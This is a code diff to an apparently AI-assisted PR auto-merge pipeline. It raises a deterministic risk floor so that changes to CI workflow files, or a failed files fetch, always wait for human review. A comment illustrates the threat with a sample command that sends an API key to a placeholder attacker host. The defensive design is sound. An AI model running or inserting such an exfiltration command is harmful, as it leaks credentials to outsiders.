@@ -671,26 +671,34 @@ _FILES_UNAVAILABLE = "<files unavailable: fail-closed>"
 def _risk_floor(tier, files):
     """Post-process the risk agent's ``tier`` with the deterministic CI-workflow floor.
 
-    Two ways the floor fires, both returning ``max(tier, 3)`` so the PR parks at the human
-    merge_approval gate (3 > AUTO_MERGE_MAX_TIER) and never auto-merges:
+    Two ways the floor fires, both returning ``max(tier, 4)`` so the PR parks at the human
+    merge_approval gate (4 > AUTO_MERGE_MAX_TIER, which is 3) and never auto-merges:
 
     1. ``files`` is a valid list AND it includes a changed ``.github/workflows`` file —
        a privileged-surface change that could exfiltrate the provisioned secret on the next
        master push (#1185).
     2. **FAIL CLOSED:** ``files`` is NOT a list (the ``GET /pulls/N/files`` fetch failed or
        returned a non-list). We cannot prove the PR doesn't touch a workflow, so we floor to
-       tier-3 and require human review rather than letting a flaky files call silently weaken
+       tier-4 and require human review rather than letting a flaky files call silently weaken
        the control (#1187). A security control must err toward the conservative side on
        missing evidence, never assume safe.
+
+    The floor is tier-4 (not tier-3): once ``AUTO_MERGE_MAX_TIER`` rose to 3 (green +
+    dev-review-cleared work through tier-3 auto-merges), a tier-3 floor would let the
+    CI-config class auto-merge — exactly the IaC-reconcile / CI-config blind spot
+    (manifest-vs-live-prod, #1282) that CI + dev-review structurally CANNOT validate. So this
+    class floors to 4 and parks for human review until the prod-state ``--check`` node lands
+    (#1300). This bumps ONLY the CI-config floor; the risk agent tiers security/migration as 4
+    on its own.
 
     A security control must not depend on an LLM noticing — this floor is mechanical.
     Returns ``(floored_tier, floored_files)``."""
     if not isinstance(files, list):
         # Couldn't fetch/parse the changed-files set -> can't prove safe -> floor (fail closed).
-        return max(int(tier), 3), [_FILES_UNAVAILABLE]
+        return max(int(tier), 4), [_FILES_UNAVAILABLE]
     floored_files = _changed_workflow_files(files)
     if floored_files:
-        return max(int(tier), 3), floored_files
+        return max(int(tier), 4), floored_files
     return int(tier), floored_files
 
 
@@ -1043,16 +1051,17 @@ async def main(input):
     # .github/workflows file is a privileged-surface change that could exfiltrate the
     # provisioned secret on the next master push (e.g. `run: curl evil -d "$AIOS_API_KEY"` —
     # no literal `secrets.` needed), so it must NEVER auto-merge. Post-process the agent's
-    # tier mechanically (tier = max(tier, 3)) rather than trusting the LLM to notice — the
+    # tier mechanically (tier = max(tier, 4)) rather than trusting the LLM to notice — the
     # risk node already has the PR, so fetch its changed files. FAIL CLOSED: if the files
     # fetch raises or returns a non-list we CANNOT prove the PR is workflow-free, so we floor
-    # to tier-3 (require a human gate) instead of letting a flaky files call silently leave a
-    # possibly-auto-merging tier standing. The floor can only RAISE the tier, never lower it,
-    # and never blocks the run.
+    # to tier-4 (require a human gate) instead of letting a flaky files call silently leave a
+    # possibly-auto-merging tier standing. The floor is tier-4 (not 3) so the class stays
+    # parked now that AUTO_MERGE_MAX_TIER is 3 (#1282/#1300). The floor can only RAISE the
+    # tier, never lower it, and never blocks the run.
     try:
         files = _json_body(await gh("GET", _ipath(repo, "/pulls/%d/files" % pr_number)))
     except Exception as exc:  # noqa: BLE001 — fetch failure must fail CLOSED, not open
-        log("risk floor files-fetch failed (failing closed to tier-3):", exc)
+        log("risk floor files-fetch failed (failing closed to tier-4):", exc)
         files = None
     tier, floored_files = _risk_floor(tier, files)
     if floored_files:
